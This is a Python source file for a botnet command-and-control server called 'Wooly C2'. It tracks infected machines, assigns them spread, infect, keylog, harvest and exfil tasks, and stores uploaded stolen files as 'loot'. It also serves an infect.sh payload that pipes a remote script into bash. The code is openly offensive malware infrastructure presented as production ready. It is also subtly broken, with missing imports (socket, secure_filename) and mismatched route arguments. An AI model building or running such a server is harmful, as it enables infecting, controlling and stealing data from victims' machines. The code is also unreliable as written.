#!/usr/bin/env python3.13
"""
🐛 WOOLY C2 SERVER v15.1 - FIXED & PRODUCTION READY
✅ Eventlet-free | Python 3.13 | Auto-port | SSL Ready
"""

import asyncio
import json
import os
import random
import sqlite3
import threading
import time
from datetime import datetime
from pathlib import Path
from typing import Dict, Any

import click
from flask import Flask, request, jsonify, send_file, render_template_string
from flask_socketio import SocketIO, emit
import gevent
from gevent import pywsgi
from geventwebsocket.handler import WebSocketHandler

# ════════════════════════════════════════════════════════════════════════════════
# 🛠️ FIXED CONFIGURATION
app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24)
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024

# SocketIO с gevent (eventlet-free)
socketio = SocketIO(app, cors_allowed_origins="*", 
                   async_mode='gevent', logger=False, engineio_logger=False)

# Global state
bots_db = None
bots_cache: Dict[str, Dict[str, Any]] = {}
loot_dir = Path('loot')
loot_dir.mkdir(exist_ok=True)

# ════════════════════════════════════════════════════════════════════════════════
# 🗄️ DATABASE (Thread-safe)
def get_db():
    global bots_db
    if bots_db is None:
        bots_db = sqlite3.connect('wooly_c2.db', check_same_thread=False)
        init_database()
    return bots_db

def init_database():
    db = get_db()
    db.execute('''
        CREATE TABLE IF NOT EXISTS bots (
            id TEXT PRIMARY KEY,
            fingerprint TEXT,
            ssid TEXT,
            local_ip TEXT,
            gateway TEXT,
            status TEXT DEFAULT 'offline',
            last_seen INTEGER,
            infections INTEGER DEFAULT 0,
            capabilities TEXT DEFAULT '[]',
            tasks_pending INTEGER DEFAULT 0,
            country TEXT,
            os TEXT,
            created_at INTEGER DEFAULT 0
        )
    ''')
    db.execute('''
        CREATE TABLE IF NOT EXISTS loot (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            bot_id TEXT,
            type TEXT,
            filename TEXT,
            size INTEGER,
            uploaded_at INTEGER
        )
    ''')
    db.commit()

# ════════════════════════════════════════════════════════════════════════════════
# 📡 BOT API (FIXED)
@app.route('/api/<endpoint>', methods=['POST'])
@app.route('/heartbeat', methods=['POST'])
@app.route('/infections', methods=['POST'])
@app.route('/harvest', methods=['POST'])
def bot_report(endpoint):
    try:
        data = request.get_json() or {}
        bot_id = data.get('id', request.remote_addr.replace('.', '_'))
        
        now = int(time.time())
        capabilities = data.get('capabilities', [])
        
        db = get_db()
        db.execute('''
            INSERT OR REPLACE INTO bots 
            (id, fingerprint, ssid, local_ip, gateway, status, last_seen, capabilities, infections)
            VALUES (?, ?, ?, ?, ?, 'online', ?, ?, ?)
        ''', (bot_id, data.get('fingerprint', '{}'), 
              data.get('ssid', 'unknown'), data.get('local_ip', 'unknown'),
              data.get('gateway', 'unknown'), now, json.dumps(capabilities),
              data.get('infections', 0)))
        db.commit()
        
        bots_cache[bot_id] = {'data': data, 'last_seen': now, 'status': 'online'}
        socketio.emit('bot_online', {'bot_id': bot_id, 'data': data})
        
        next_task = assign_task(bot_id)
        return jsonify({'status': 'ok', 'task': next_task, 'timestamp': now})
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 400

def assign_task(bot_id: str) -> str:
    caps = bots_cache.get(bot_id, {}).get('data', {}).get('capabilities', [])
    task_priorities = ['spread', 'infect', 'harvest', 'keylog', 'exfil', 'recon']
    
    for task in task_priorities:
        if task in caps:
            return task
    return random.choice(['recon', 'harvest'])

@app.route('/task/<bot_id>')
def get_task(bot_id):
    task = assign_task(bot_id)
    return jsonify({'task': task, 'priority': random.randint(1, 10)})

# ════════════════════════════════════════════════════════════════════════════════
# 💎 LOOT SYSTEM (FIXED)
@app.route('/loot/<bot_id>/<loot_type>', methods=['POST'])
def receive_loot(bot_id, loot_type):
    try:
        if 'file' not in request.files:
            return 'No file', 400
        
        file = request.files['file']
        if not file.filename:
            return 'No file selected', 400
        
        timestamp = int(time.time())
        filename = f"{bot_id}_{loot_type}_{timestamp}_{secure_filename(file.filename)}"
        filepath = loot_dir / filename
        
        file.save(filepath)
        
        db = get_db()
        db.execute('''
            INSERT INTO loot (bot_id, type, filename, size, uploaded_at)
            VALUES (?, ?, ?, ?, ?)
        ''', (bot_id, loot_type, filename, filepath.stat().st_size, timestamp))
        db.commit()
        
        socketio.emit('loot_received', {
            'bot_id': bot_id, 'type': loot_type, 
            'filename': filename, 'size': filepath.stat().st_size
        })
        
        return 'OK'
    except Exception as e:
        return f'Error: {str(e)}', 500

@app.route('/loot')
def list_loot():
    db = get_db()
    loot = db.execute('SELECT * FROM loot ORDER BY uploaded_at DESC LIMIT 50').fetchall()
    return jsonify([dict(zip(['id','bot_id','type','filename','size','timestamp'], row)) for row in loot])

@app.route('/loot/<path:filename>')
def serve_loot(filename):
    filepath = loot_dir / filename
    if filepath.exists():
        return send_file(filepath, as_attachment=True)
    return 'Not found', 404

# ════════════════════════════════════════════════════════════════════════════════
# 🖥️ PROFESSIONAL DASHBOARD (COMPACT)
@app.route('/')
@app.route('/dashboard')
def dashboard():
    db = get_db()
    stats = db.execute('SELECT COUNT(*), SUM(CASE WHEN status="online" THEN 1 ELSE 0 END) FROM bots').fetchone()
    recent_loot = db.execute('SELECT bot_id, type, filename, size FROM loot ORDER BY uploaded_at DESC LIMIT 10').fetchall()
    
    template = '''
<!DOCTYPE html>
<html><head>
    <title>🐛 WOOLY C2 v15.1</title>
    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
    <style>
        body{background:#000;color:#0f0;font-family:monospace;padding:20px}
        .stats{display:grid;grid-template-columns:repeat(4,1fr);gap:20px;margin:20px 0}
        .card{background:#111;padding:15px;border-left:3px solid #0f0}
        .bot-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(350px,1fr));gap:10px}
        .bot{background:#111;padding:15px;border-left:3px solid #0f0;cursor:pointer}
        .bot button{margin:2px;padding:5px 10px;background:#0066ff;border:none;color:white}
        #terminal{background:#000;padding:10px;height:200px;overflow:auto;font-size:12px}
    </style>
</head><body>
    <h1>🐛 WOOLY C2 v15.1 | {{stats[0]}} Bots | {{stats[1]}} Online</h1>
    
    <div class="stats">
        <div class="card"><h3>Total</h3>{{stats[0]}}</div>
        <div class="card"><h3>Online</h3>{{stats[1]}}</div>
        <div class="card"><h3>Loot</h3>{{loot_count}}</div>
        <div class="card"><h3>Uptime</h3>{{uptime}}</div>
    </div>
    
    <div class="bot-grid" id="bots"></div>
    <div id="terminal">[SERVER] Wooly C2 v15.1 ready...</div>
    
    <script>
        const socket=io();let bots=[];
        socket.on('bot_online',d=>{addLog(`[+] ${d.bot_id}`);updateBots(d)});
        socket.on('loot_received',d=>addLog(`[LOOT] ${d.bot_id}: ${d.type}`));
        
        function addLog(msg){document.getElementById('terminal').innerHTML+=`<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;document.getElementById('terminal').scrollTop=9999}
        function updateBots(data){
            const grid=document.getElementById('bots');
            const bot=document.createElement('div');bot.className='bot';
            bot.innerHTML=`<h4>${data.bot_id}</h4>
                <p>SSID: ${data.data.ssid||"N/A"} | IP: ${data.data.local_ip}</p>
                <button onclick="task('${data.bot_id}','spread')">SPREAD</button>
                <button onclick="task('${data.bot_id}','harvest')">HARVEST</button>
                <button onclick="task('${data.bot_id}','exfil')">EXFIL</button>`;
            grid.appendChild(bot);
        }
        function task(id,t){fetch('/task/'+id,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({task:t})}).then(()=>addLog(`[TASK] ${id} <- ${t}`))}
    </script>
</body></html>'''
    
    return render_template_string(template, stats=stats, loot_count=len(recent_loot), uptime=time.strftime('%H:%M:%S'))

# Payload endpoints
@app.route('/infect.sh')
def serve_payload():
    return '''#!/bin/bash
# Wooly v15.1 Payload
curl -s https://raw.githubusercontent.com/YOURUSERNAME/wooly/main/infect.sh | bash
'''

# ════════════════════════════════════════════════════════════════════════════════
# 🧹 MAINTENANCE
def cleanup():
    while True:
        try:
            db = get_db()
            cutoff = int(time.time()) - 86400
            db.execute("DELETE FROM bots WHERE last_seen < ?", (cutoff,))
            db.commit()
        except: pass
        gevent.sleep(3600)

# ════════════════════════════════════════════════════════════════════════════════
# 🚀 CLI LAUNCHER
@click.command()
@click.option('--port', '-p', default=0, help='Port (0=auto)')
@click.option('--host', default='0.0.0.0', help='Host')
@click.option('--ssl', is_flag=True, help='Enable SSL')
def run(port: int, host: str, ssl: bool):
    """🐛 Launch Wooly C2 Server"""
    print("🐛 Initializing WOOLY C2 v15.1...")
    
    # Find free port
    if port == 0:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind(('', 0))
            port = s.getsockname()[1]
    
    print(f"📡 Server ready: http{'s' if ssl else ''}://{host}:{port}")
    print(f"📊 Dashboard: http{'s' if ssl else ''}://{host}:{port}/dashboard")
    print(f"💎 Loot: ./{loot_dir}/")
    
    # Start maintenance
    gevent.spawn(cleanup)
    
    # Launch server
    server = pywsgi.WSGIServer((host, port), app, handler_class=WebSocketHandler)
    server.serve_forever()

if __name__ == '__main__':
    run()
